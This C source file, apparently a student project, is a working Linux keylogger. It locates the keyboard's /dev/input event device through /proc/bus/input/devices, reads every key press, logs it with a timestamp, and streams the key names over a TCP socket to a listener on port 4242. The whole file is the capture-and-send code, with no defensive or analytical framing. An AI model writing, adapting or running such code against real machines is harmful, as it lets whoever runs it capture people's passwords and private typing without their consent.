#include "gnl.h"

const char *keymap[] = {
    [KEY_A] = "A", [KEY_B] = "B", [KEY_C] = "C", [KEY_D] = "D",
    [KEY_E] = "E", [KEY_F] = "F", [KEY_G] = "G", [KEY_H] = "H",
    [KEY_I] = "I", [KEY_J] = "J", [KEY_K] = "K", [KEY_L] = "L",
    [KEY_M] = "M", [KEY_N] = "N", [KEY_O] = "O", [KEY_P] = "P",
    [KEY_Q] = "Q", [KEY_R] = "R", [KEY_S] = "S", [KEY_T] = "T",
    [KEY_U] = "U", [KEY_V] = "V", [KEY_W] = "W", [KEY_X] = "X",
    [KEY_Y] = "Y", [KEY_Z] = "Z",

    [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3", [KEY_4] = "4",
    [KEY_5] = "5", [KEY_6] = "6", [KEY_7] = "7", [KEY_8] = "8",
    [KEY_9] = "9", [KEY_0] = "0",

    [KEY_SPACE] = "SPACE",
    [KEY_ENTER] = "ENTER",
    [KEY_BACKSPACE] = "BACKSPACE",
    [KEY_TAB] = "TAB",
    [KEY_ESC] = "ESC",

    [KEY_MINUS] = "-", [KEY_EQUAL] = "=", 
    [KEY_LEFTBRACE] = "[", [KEY_RIGHTBRACE] = "]",
    [KEY_BACKSLASH] = "\\", [KEY_SEMICOLON] = ";",
    [KEY_APOSTROPHE] = "'", [KEY_GRAVE] = "`",
    [KEY_COMMA] = ",", [KEY_DOT] = ".", [KEY_SLASH] = "/",

    [KEY_LEFTSHIFT] = "LSHIFT", [KEY_RIGHTSHIFT] = "RSHIFT",
    [KEY_LEFTCTRL] = "LCTRL", [KEY_RIGHTCTRL] = "RCTRL",
    [KEY_LEFTALT] = "LALT", [KEY_RIGHTALT] = "RALT",
    [KEY_CAPSLOCK] = "CAPSLOCK",

    [KEY_UP] = "UP", [KEY_DOWN] = "DOWN",
    [KEY_LEFT] = "LEFT", [KEY_RIGHT] = "RIGHT",

    [KEY_F1] = "F1", [KEY_F2] = "F2", [KEY_F3] = "F3", [KEY_F4] = "F4",
    [KEY_F5] = "F5", [KEY_F6] = "F6", [KEY_F7] = "F7", [KEY_F8] = "F8",
    [KEY_F9] = "F9", [KEY_F10] = "F10", [KEY_F11] = "F11", [KEY_F12] = "F12",
};

void read_event(char *event)
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket client");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(4242);
    inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("connection au serveur échouée");
        exit(EXIT_FAILURE);
    }

    char *device = malloc(sizeof(char *) * (strlen(event) + strlen("/dev/input/")) + 1);
    strcpy(device, "/dev/input/");
    strcat(device,event);
    int fd = open(device, O_RDONLY);
    if (fd < 0) {
        perror("Erreur d'ouverture du fichier d'entrée");
        exit(0);
    }

    fd_set read_fds;
    struct input_event ev;

    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(fd, &read_fds);

        int ret = select(fd + 1, &read_fds, NULL, NULL, NULL);
        if (ret < 0) {
            perror("Erreur avec select()");
            break;
        }

        if (FD_ISSET(fd, &read_fds)) {
            ssize_t bytes = read(fd, &ev, sizeof(struct input_event));
            if (bytes == sizeof(struct input_event)) {
                if (ev.type == EV_KEY && ev.value == 1) 
                {
                    const char *key = keymap[ev.code];
                    if (key) 
                    {
                        char buffer[64];
                        snprintf(buffer, sizeof(buffer), "[%s]", key);
                        send(sock, buffer, strlen(buffer), 0);
                        printf("[%ld.%06ld][%s]\n", ev.time.tv_sec, ev.time.tv_usec, key);
                    } else {
                        printf("[%ld.%06ld][UNKNOWN CODE: %d]\n", ev.time.tv_sec, ev.time.tv_usec, ev.code);
                    }
                }
            } else {
                perror("Erreur de lecture");
                break;
            }
        }
    }
    close(fd);
    close(sock);
}

static int	get_file_len(int fd)
{
	int		i;
	char	*line;

	line = NULL;
	i = 0;
	while (get_next_line(fd, &line) == 1)
	{
		i++;
		free(line);
	}
	free(line);
	close(fd);
	return (i);
}

char *retrieve_event(char **device_content)
{
    bool detected_n = false;
    int i = 0;
    char *event = malloc(sizeof(char *) * 6);
    while (device_content[i])
    {
        if (strstr(device_content[i], "Name") != NULL) 
        {
            if (strstr(device_content[i], "keyboard") != NULL)
                detected_n = true;
        }
        if (detected_n == true)
        {
            if (strstr(device_content[i], "Handlers") != NULL) 
            {
                if (strstr(device_content[i], "event") != NULL)
                {
                    strncpy(event, strstr(device_content[i], "event"), 6);
                    return event;
                }
            }
        }
        i++;
    }
    return NULL;
}

char *parse_device_name()
{
    int fd = open("/proc/bus/input/devices", O_RDONLY);
    char *event;
    if (fd < 0)
    {
        perror("can't read the content of devices");
        exit(EXIT_FAILURE);
    };
    char *line;
    size_t size = get_file_len(fd);
    fd = open("/proc/bus/input/devices", O_RDONLY);
    if (fd < 0)
    {
        perror("can't read the content of devices");
        exit(EXIT_FAILURE);
    };
    char **device_content = calloc(size + 1, sizeof(char *));
    int i = 0;
    while (i <= size)
    {
        get_next_line(fd, &line);
		device_content[i] = ft_strdup(line);
		free(line);
		i++;
    }
    event = retrieve_event(device_content);
    for (int i = 0; i < size; i++) {
        free(device_content[i]);
    }
    free(device_content);
    close(fd);
    return event;
}


int main() {
    read_event(parse_device_name());
    return 0;
}